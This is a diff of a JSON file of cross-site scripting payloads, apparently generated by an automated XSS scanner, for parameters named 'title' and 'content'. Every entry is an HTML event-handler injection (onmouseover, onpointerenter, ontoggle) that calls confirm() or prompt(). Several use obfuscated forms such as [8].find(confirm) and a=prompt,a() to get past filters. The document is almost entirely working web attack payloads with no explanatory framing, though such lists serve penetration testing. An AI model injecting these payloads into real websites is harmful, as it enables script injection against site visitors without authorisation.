@@ -5,52 +5,52 @@
       {
         "payloads": [
           {
-            "payload": "<html onmouseover = confirm()//"
+            "payload": "<html onmouseover = (confirm)()//"
           },
           {
-            "payload": "<d3v onmouseover = confirm()>v3dm0s"
+            "payload": "<html onmouseover = (confirm)()>"
           },
           {
-            "payload": "<a onpointerenter = [8].find(confirm)>v3dm0s"
+            "payload": "<a onmouseover = [8].find(confirm)>v3dm0s"
           },
           {
-            "payload": "<html onpointerenter = [8].find(confirm)>"
+            "payload": "<details onpointerenter = a=prompt,a()  //"
+          },
+          {
+            "payload": "<d3v onmouseover = (prompt)``>v3dm0s"
+          },
+          {
+            "payload": "<d3v onpointerenter = a=prompt,a()  >v3dm0s"
+          },
+          {
+            "payload": "<d3v onpointerenter = (prompt)``>v3dm0s"
+          },
+          {
+            "payload": "<a onmouseover = (confirm)()  >v3dm0s"
+          },
+          {
+            "payload": "<a onpointerenter = a=prompt,a()  >v3dm0s"
+          },
+          {
+            "payload": "<a onpointerenter = (confirm)()  >v3dm0s"
+          },
+          {
+            "payload": "<d3v onmouseover = (confirm)()>v3dm0s"
+          },
+          {
+            "payload": "<html onmouseover = [8].find(confirm)//"
+          },
+          {
+            "payload": "<details onpointerenter = confirm()>"
+          },
+          {
+            "payload": "<html onmouseover = a=prompt,a()>"
+          },
+          {
+            "payload": "<details ontoggle = confirm()  >"
           },
           {
             "payload": "<html onpointerenter = confirm()  >"
-          },
-          {
-            "payload": "<details ontoggle = (confirm)()  >"
-          },
-          {
-            "payload": "<d3v onpointerenter = a=prompt,a()>v3dm0s"
-          },
-          {
-            "payload": "<html onmouseover = confirm()>"
-          },
-          {
-            "payload": "<a onpointerenter = confirm()  >v3dm0s"
-          },
-          {
-            "payload": "<a onpointerenter = confirm()>v3dm0s"
-          },
-          {
-            "payload": "<details ontoggle = confirm()//"
-          },
-          {
-            "payload": "<html onmouseover = a=prompt,a()  //"
-          },
-          {
-            "payload": "<a onpointerenter = [8].find(confirm)  >v3dm0s"
-          },
-          {
-            "payload": "<details ontoggle = (prompt)``  >"
-          },
-          {
-            "payload": "<html onpointerenter = a=prompt,a()>"
-          },
-          {
-            "payload": "<html onpointerenter = [8].find(confirm)  //"
           }
         ],
         "parameter": "title"
@@ -58,52 +58,52 @@
       {
         "payloads": [
           {
-            "payload": "<a onmouseover = a=prompt,a()>v3dm0s"
-          },
-          {
-            "payload": "<details ontoggle = a=prompt,a()  >"
-          },
-          {
-            "payload": "<details onpointerenter = confirm()  >"
-          },
-          {
-            "payload": "<a onmouseover = [8].find(confirm)>v3dm0s"
-          },
-          {
-            "payload": "<a onpointerenter = (confirm)()>v3dm0s"
+            "payload": "<d3v onpointerenter = (prompt)``>v3dm0s"
           },
           {
             "payload": "<details onpointerenter = confirm()>"
           },
           {
-            "payload": "<details ontoggle = confirm()//"
+            "payload": "<html onpointerenter = a=prompt,a()//"
           },
           {
-            "payload": "<details onpointerenter = (confirm)()  //"
+            "payload": "<html onmouseover = confirm()  >"
           },
           {
-            "payload": "<a onmouseover = (confirm)()  >v3dm0s"
-          },
-          {
-            "payload": "<html onpointerenter = confirm()  >"
-          },
-          {
-            "payload": "<d3v onpointerenter = confirm()>v3dm0s"
-          },
-          {
-            "payload": "<a onmouseover = a=prompt,a()>v3dm0s"
-          },
-          {
-            "payload": "<html onpointerenter = [8].find(confirm)//"
-          },
-          {
-            "payload": "<d3v onpointerenter = [8].find(confirm)  >v3dm0s"
-          },
-          {
-            "payload": "<html onmouseover = (confirm)()>"
+            "payload": "<details ontoggle = confirm()  >"
           },
           {
             "payload": "<d3v onmouseover = (prompt)``>v3dm0s"
+          },
+          {
+            "payload": "<details onpointerenter = confirm()>"
+          },
+          {
+            "payload": "<html onpointerenter = (confirm)()  >"
+          },
+          {
+            "payload": "<html onmouseover = confirm()>"
+          },
+          {
+            "payload": "<html onpointerenter = (prompt)``  >"
+          },
+          {
+            "payload": "<a onmouseover = [8].find(confirm)  >v3dm0s"
+          },
+          {
+            "payload": "<a onmouseover = (confirm)()>v3dm0s"
+          },
+          {
+            "payload": "<details ontoggle = [8].find(confirm)  >"
+          },
+          {
+            "payload": "<details ontoggle = a=prompt,a()>"
+          },
+          {
+            "payload": "<details onpointerenter = confirm()>"
+          },
+          {
+            "payload": "<details onpointerenter = [8].find(confirm)>"
           }
         ],
         "parameter": "content"
